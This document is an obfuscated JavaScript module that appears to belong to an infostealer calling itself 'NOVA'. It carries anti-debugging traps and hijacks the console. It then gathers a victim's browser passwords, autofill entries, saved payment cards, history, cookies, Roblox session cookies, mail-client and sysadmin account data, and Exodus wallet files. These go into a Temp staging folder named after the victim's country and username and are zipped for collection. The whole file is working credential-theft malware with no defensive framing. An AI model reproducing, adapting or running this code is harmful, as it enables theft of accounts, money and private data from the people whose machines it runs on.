const _0x13a9c8 = (function () {
    let _0x3855e9 = true
    return function (_0x2cc743, _0x5cd221) {
      const _0x38064e = _0x3855e9
        ? function () {
            if (_0x5cd221) {
              const _0x4c6649 = _0x5cd221.apply(_0x2cc743, arguments)
              return (_0x5cd221 = null), _0x4c6649
            }
          }
        : function () {}
      return (_0x3855e9 = false), _0x38064e
    }
  })(),
  _0x21205b = _0x13a9c8(this, function () {
    return _0x21205b
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x21205b)
      .search('(((.+)+)+)+$')
  })
_0x21205b()
const _0x3e87b2 = (function () {
  let _0x1882d8 = true
  return function (_0x216d6e, _0x21f738) {
    const _0x218add = _0x1882d8
      ? function () {
          if (_0x21f738) {
            const _0x57e0cb = _0x21f738.apply(_0x216d6e, arguments)
            return (_0x21f738 = null), _0x57e0cb
          }
        }
      : function () {}
    return (_0x1882d8 = false), _0x218add
  }
})()
;(function () {
  _0x3e87b2(this, function () {
    const _0x43cb3b = new RegExp('function *\\( *\\)'),
      _0x3cb14d = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x561342 = _0x2c3f40('init')
    !_0x43cb3b.test(_0x561342 + 'chain') || !_0x3cb14d.test(_0x561342 + 'input')
      ? _0x561342('0')
      : _0x2c3f40()
  })()
})()
const _0x801510 = (function () {
    let _0x7aa26 = true
    return function (_0x5b689b, _0x1e4a2e) {
      const _0x3be8e0 = _0x7aa26
        ? function () {
            if (_0x1e4a2e) {
              const _0x76d935 = _0x1e4a2e.apply(_0x5b689b, arguments)
              return (_0x1e4a2e = null), _0x76d935
            }
          }
        : function () {}
      return (_0x7aa26 = false), _0x3be8e0
    }
  })(),
  _0x208047 = _0x801510(this, function () {
    const _0x1005de = function () {
      let _0x291329
      try {
        _0x291329 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x3fb95b) {
        _0x291329 = window
      }
      return _0x291329
    }
    const _0x58c84c = _0x1005de(),
      _0x426afd = (_0x58c84c.console = _0x58c84c.console || {}),
      _0x2d1b6d = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x186439 = 0; _0x186439 < _0x2d1b6d.length; _0x186439++) {
      const _0x527070 = _0x801510.constructor.prototype.bind(_0x801510),
        _0xfcae4e = _0x2d1b6d[_0x186439],
        _0x5a0cd1 = _0x426afd[_0xfcae4e] || _0x527070
      _0x527070['__proto__'] = _0x801510.bind(_0x801510)
      _0x527070.toString = _0x5a0cd1.toString.bind(_0x5a0cd1)
      _0x426afd[_0xfcae4e] = _0x527070
    }
  })
_0x208047()
const _0x12ba6e = require('./core'),
  _0x3725e1 = require('fs'),
  _0x26ca96 = require('path'),
  _0x293f5b = require('archiver')
async function _0xf0f115() {
  const {
    ip: _0x49889f,
    hostname: _0x224269,
    city: _0xe35613,
    region: _0x305ff9,
    country: _0x521e30,
    loc: _0xbc0396,
    org: _0x4f53a3,
    postal: _0x458ea3,
    timezone: _0x33309f,
  } = await _0x12ba6e.getPublicIp()
  try {
    return (
      process.env.localappdata +
      '\\' +
      'Temp' +
      '\\' +
      (_0x521e30.toUpperCase() +
        '_NOVA_' +
        (process.env.USERNAME.replace('.', '') || 'USER'))
    )
  } catch (_0x45519a) {
    if (_0x45519a) {
      return (
        process.env.localappdata +
        '\\' +
        'Temp' +
        '\\' +
        ('KS_NOVA_' + (process.env.USERNAME.replace('.', '') || 'USER'))
      )
    }
  }
}
async function _0x3e49bd() {
  const {
    ip: _0x1ebe7d,
    hostname: _0x21b262,
    city: _0x51fc8f,
    region: _0xdc9db3,
    country: _0x214028,
    loc: _0x49a868,
    org: _0x1a9b46,
    postal: _0x477438,
    timezone: _0x37f001,
  } = await _0x12ba6e.getPublicIp()
  try {
    return (
      process.env.localappdata +
      '\\' +
      'Temp' +
      '\\' +
      (_0x214028.toUpperCase() +
        '_NOVA_' +
        (process.env.USERNAME.replace('.', '') || 'USER')) +
      '.zip'
    )
  } catch (_0x260704) {
    if (_0x260704) {
      return (
        process.env.localappdata +
        '\\' +
        'Temp' +
        '\\' +
        ('KS_NOVA_' + (process.env.USERNAME.replace('.', '') || 'USER')) +
        '.zip'
      )
    }
  }
}
async function _0x2074d9() {
  let _0x5e9a6e = await _0x3e49bd(),
    _0x4a92e0 = await _0xf0f115()
  _0x3725e1.existsSync(_0x4a92e0) &&
    _0x3725e1.rmSync(_0x4a92e0, { recursive: true })
  _0x3725e1.mkdirSync(_0x4a92e0)
  _0x3725e1.existsSync(_0x5e9a6e) &&
    _0x3725e1.rmSync(_0x5e9a6e, { recursive: true })
}
async function _0x149ec0(_0x804633, _0x182d70, _0x27de53) {
  let _0x37b572 = await _0xf0f115()
  const _0x6e5dc0 = _0x12ba6e.recursiveRead(_0x804633, _0x804633, '')
  for (var _0x6fea84 = 0; _0x6fea84 < _0x6e5dc0.length; _0x6fea84++) {
    const _0x261c6c = _0x6e5dc0[_0x6fea84],
      _0x1d7095 =
        _0x37b572 +
        '\\' +
        _0x182d70 +
        '\\' +
        _0x27de53 +
        '\\' +
        _0x261c6c.replace(_0x804633, '')
    try {
      _0x25b4c0(_0x1d7095)
      _0x3725e1.writeFileSync(_0x1d7095, _0x3725e1.readFileSync(_0x261c6c))
    } catch (_0x4bf947) {}
  }
}
async function _0x339464(_0x5c53f2, _0x483e65) {
  let _0x850ca = await _0xf0f115()
  const _0x10500c = _0x12ba6e.recursiveRead(_0x5c53f2, _0x5c53f2, '')
  for (var _0x509d79 = 0; _0x509d79 < _0x10500c.length; _0x509d79++) {
    const _0x3aaf50 = _0x10500c[_0x509d79],
      _0x1a2c1a =
        _0x850ca + '\\' + _0x483e65 + '\\' + _0x3aaf50.replace(_0x5c53f2, '')
    try {
      _0x25b4c0(_0x1a2c1a)
      _0x3725e1.writeFileSync(_0x1a2c1a, _0x3725e1.readFileSync(_0x3aaf50))
    } catch (_0x5c3233) {}
  }
}
async function _0x50b6e9(_0xb0f278, _0x49f822, _0x172b13) {
  let _0x5eb56a = await _0xf0f115()
  for (var _0x103aad = 0; _0x103aad < _0xb0f278.length; _0x103aad++) {
    const _0x24df23 = _0xb0f278[_0x103aad]
    try {
      if (_0x3725e1.lstatSync(_0x24df23).isDirectory()) {
        const _0x21821e = _0x12ba6e.recursiveRead(_0x24df23, _0x24df23, '')
        for (var _0x1f433a = 0; _0x1f433a < _0x21821e.length; _0x1f433a++) {
          const _0x4ec593 = _0x21821e[_0x1f433a]
          let _0x277e3b
          _0x172b13 != ''
            ? (_0x277e3b =
                _0x5eb56a +
                '\\' +
                _0x49f822 +
                '\\' +
                _0x172b13 +
                '\\' +
                _0x24df23.slice(0, -1).split('\\').pop() +
                '\\' +
                _0x12ba6e.fileName(_0x4ec593))
            : (_0x277e3b =
                _0x5eb56a +
                '\\' +
                _0x49f822 +
                '\\' +
                _0x24df23.slice(0, -1).split('\\').pop() +
                '\\' +
                _0x12ba6e.fileName(_0x4ec593))
          try {
            _0x25b4c0(_0x277e3b)
            _0x3725e1.writeFileSync(
              _0x277e3b,
              _0x3725e1.readFileSync(_0x4ec593)
            )
          } catch (_0x5314de) {}
        }
      } else {
        const _0x81c3ef =
          _0x5eb56a +
          '\\' +
          _0x49f822 +
          '\\' +
          _0x172b13 +
          '\\' +
          _0x12ba6e.fileName(_0x24df23)
        try {
          _0x25b4c0(_0x81c3ef)
          _0x3725e1.writeFileSync(_0x81c3ef, _0x3725e1.readFileSync(_0x24df23))
        } catch (_0x4c4756) {}
      }
    } catch (_0x3f1e24) {}
  }
}
function _0x25b4c0(_0x5e14cd) {
  var _0x2b56fc = _0x5e14cd.split(_0x26ca96.sep)
  var _0x17a8ca = ''
  for (var _0x2d190d = 0; _0x2d190d < _0x2b56fc.length - 1; _0x2d190d++) {
    ;(_0x17a8ca += _0x2b56fc[_0x2d190d] + _0x26ca96.sep),
      !_0x3725e1.existsSync(_0x17a8ca) && _0x3725e1.mkdirSync(_0x17a8ca)
  }
}
async function _0x3c682f(_0x56acb4, _0x13f3a9) {
  let _0x2229b2 = await _0xf0f115()
  if (_0x56acb4.length == 0) {
    return
  }
  var _0x52ce0d = _0x2229b2 + '\\Browsers\\'
  try {
    _0x3725e1.mkdirSync(_0x52ce0d)
  } catch (_0x3e727d) {}
  _0x52ce0d += 'Cookies.txt'
  var _0x2eb281 = ''
  for (let _0x26e141 = 0; _0x26e141 < _0x56acb4.length; _0x26e141++) {
    _0x2eb281 += _0x56acb4[_0x26e141].build()
  }
  _0x3725e1.writeFileSync(_0x52ce0d, _0x2eb281)
}
async function _0x148a7b(_0x3c49ae, _0x4d08d6) {
  let _0x4ae50f = await _0xf0f115()
  var _0x27b5d3 = _0x4ae50f + '\\Games\\'
  try {
    _0x3725e1.mkdirSync(_0x27b5d3)
  } catch (_0x5a41cc) {}
  _0x27b5d3 += 'Roblox\\'
  try {
    _0x3725e1.mkdirSync(_0x27b5d3)
  } catch (_0x1013d9) {}
  _0x27b5d3 += 'cookies@' + _0x4d08d6 + '.txt'
  var _0x46030f = ''
  for (let _0x4fb3c1 = 0; _0x4fb3c1 < _0x3c49ae.length; _0x4fb3c1++) {
    _0x46030f += _0x3c49ae[_0x4fb3c1].build()
  }
  _0x3725e1.writeFileSync(_0x27b5d3, _0x46030f)
}
async function _0x1c9350(_0x1a674d, _0x1cbb2b) {
  let _0x10bf5e = await _0xf0f115(),
    _0x554127 = _0x10bf5e + '\\MailClients\\'
  try {
    _0x3725e1.mkdirSync(_0x554127)
  } catch (_0x2be9e0) {}
  _0x554127 += _0x1cbb2b + '\\'
  try {
    _0x3725e1.mkdirSync(_0x554127)
  } catch (_0x2ebcae) {}
  _0x3725e1.writeFileSync(
    _0x554127 + 'accounts.json',
    JSON.stringify(_0x1a674d, null, 4)
  )
}
async function _0x1fd540(
  _0x48e41a,
  _0x4083ab,
  _0x1e5290,
  _0x5bf4a6,
  _0x193851,
  _0x57bffb
) {
  let _0x1909c4 = await _0xf0f115()
  const _0x46f677 = _0x1909c4 + '\\Browsers\\'
  try {
    _0x3725e1.mkdirSync(_0x46f677)
  } catch (_0xa442cf) {}
  let _0xdd409a = ''
  for (let _0xe14f49 = 0; _0xe14f49 < _0x48e41a.length; _0xe14f49++) {
    _0xdd409a += _0x48e41a[_0xe14f49].build() + '\n'
  }
  _0xdd409a.length != 0 && (_0xdd409a = _0x12ba6e.getHeader() + _0xdd409a)
  let _0x544e90 = ''
  for (let _0x3efe84 = 0; _0x3efe84 < _0x4083ab.length; _0x3efe84++) {
    _0x544e90 += _0x4083ab[_0x3efe84].build() + '\n'
  }
  _0x544e90.length != 0 && (_0x544e90 = _0x12ba6e.getHeader() + _0x544e90)
  let _0x4342bd = ''
  for (let _0x303a8 = 0; _0x303a8 < _0x5bf4a6.length; _0x303a8++) {
    _0x4342bd += _0x5bf4a6[_0x303a8].build() + '\n'
  }
  _0x4342bd.length != 0 && (_0x4342bd = _0x12ba6e.getHeader() + _0x4342bd)
  let _0x59b187 = ''
  for (let _0x75dc31 = 0; _0x75dc31 < _0x193851.length; _0x75dc31++) {
    _0x59b187 += _0x193851[_0x75dc31].build() + '\n'
  }
  _0x59b187.length != 0 && (_0x59b187 = _0x12ba6e.getHeader() + _0x59b187)
  let _0x565e0c = ''
  for (let _0x1a8137 = 0; _0x1a8137 < _0x57bffb.length; _0x1a8137++) {
    _0x565e0c += _0x57bffb[_0x1a8137].build() + '\n'
  }
  _0x565e0c.length != 0 && (_0x565e0c = _0x12ba6e.getHeader() + _0x565e0c)
  let _0x108371 = ''
  for (let _0x88481b = 0; _0x88481b < _0x1e5290.length; _0x88481b++) {
    _0x108371 += _0x1e5290[_0x88481b].build() + '\n'
  }
  _0x108371.length != 0 && (_0x108371 = _0x12ba6e.getHeader() + _0x108371)
  _0x3725e1.writeFileSync(_0x46f677 + 'Passwords.txt', _0xdd409a)
  _0x3725e1.writeFileSync(_0x46f677 + 'AutoFill.txt', _0x544e90)
  _0x3725e1.writeFileSync(_0x46f677 + 'History.txt', _0x4342bd)
  _0x3725e1.writeFileSync(_0x46f677 + 'Downloads.txt', _0x59b187)
  _0x3725e1.writeFileSync(_0x46f677 + 'Bookmarks.txt', _0x565e0c)
  _0x3725e1.writeFileSync(_0x46f677 + 'Cards.txt', _0x108371)
}
async function _0x1c9350(_0x1f6aa6, _0x1ad9bb) {
  let _0x5ed683 = await _0xf0f115()
  let _0x4a3b75 = _0x5ed683 + '\\MailClients\\'
  try {
    _0x3725e1.mkdirSync(_0x4a3b75)
  } catch (_0xec93cf) {}
  _0x4a3b75 += _0x1ad9bb + '\\'
  try {
    _0x3725e1.mkdirSync(_0x4a3b75)
  } catch (_0x22963e) {}
  _0x3725e1.writeFileSync(
    _0x4a3b75 + 'accounts.json',
    JSON.stringify(_0x1f6aa6, null, 4)
  )
}
async function _0x23938e(_0x2a8793, _0x1b8393) {
  let _0x34ec3d = await _0xf0f115(),
    _0x2b1e71 = _0x34ec3d + '\\SysAdmin\\'
  try {
    _0x3725e1.mkdirSync(_0x2b1e71)
  } catch (_0x528da4) {}
  _0x2b1e71 += _0x1b8393 + '\\'
  try {
    _0x3725e1.mkdirSync(_0x2b1e71)
  } catch (_0x2cbc03) {}
  _0x3725e1.writeFileSync(
    _0x2b1e71 + 'accounts.json',
    JSON.stringify(_0x2a8793, null, 4)
  )
}
async function _0xda7f6d() {
  let _0x34feac = await _0x3e49bd(),
    _0x2f61bb = await _0xf0f115()
  const _0x59e0bb = _0x293f5b('zip', { zlib: { level: 9 } }),
    _0x566b65 = _0x3725e1.createWriteStream(_0x34feac)
  return new Promise((_0x349df5, _0x3cb414) => {
    try {
      _0x59e0bb
        .directory(_0x2f61bb + '\\', false)
        .on('error', (_0x267291) => _0x3cb414(_0x267291))
        .pipe(_0x566b65)
      _0x566b65.on('close', () => _0x349df5(_0x34feac))
      _0x59e0bb.finalize().then(() => {})
    } catch {}
  })
}
function _0x36d5a0(_0x525157) {
  _0x525157 = _0x26ca96.join(_0x525157[0], '..')
  const _0x2e1f32 = _0x293f5b('zip', { zlib: { level: 9 } })
  const _0x1d8aa1 = _0x3725e1.createWriteStream(_0x525157 + '\\Exodus.zip')
  return new Promise((_0x40b602, _0x5e87c8) => {
    try {
      _0x2e1f32
        .directory(_0x525157 + '\\', false)
        .on('error', (_0x8a6f1c) => _0x5e87c8(_0x8a6f1c))
        .pipe(_0x1d8aa1)
      _0x1d8aa1.on('close', () => _0x40b602(_0x525157 + '\\Exodus.zip'))
      _0x2e1f32.finalize().then(() => {})
    } catch {}
  })
}
module.exports = {
  getbasepath: _0xf0f115,
  Init: _0x2074d9,
  SimpleSave: _0x339464,
  Save: _0x149ec0,
  ArraySave: _0x50b6e9,
  zipResult: _0xda7f6d,
  saveBrowser: _0x1fd540,
  saveCookies: _0x3c682f,
  saveRoblox: _0x148a7b,
  saveMailClients: _0x1c9350,
  saveSysAdmin: _0x23938e,
  zip: _0x36d5a0,
}
function _0x2c3f40(_0x431a37) {
  function _0x393487(_0x1a0883) {
    if (typeof _0x1a0883 === 'string') {
      return function (_0x384334) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x1a0883 / _0x1a0883).length !== 1 || _0x1a0883 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x393487(++_0x1a0883)
  }
  try {
    if (_0x431a37) {
      return _0x393487
    } else {
      _0x393487(0)
    }
  } catch (_0x4ec649) {}
}
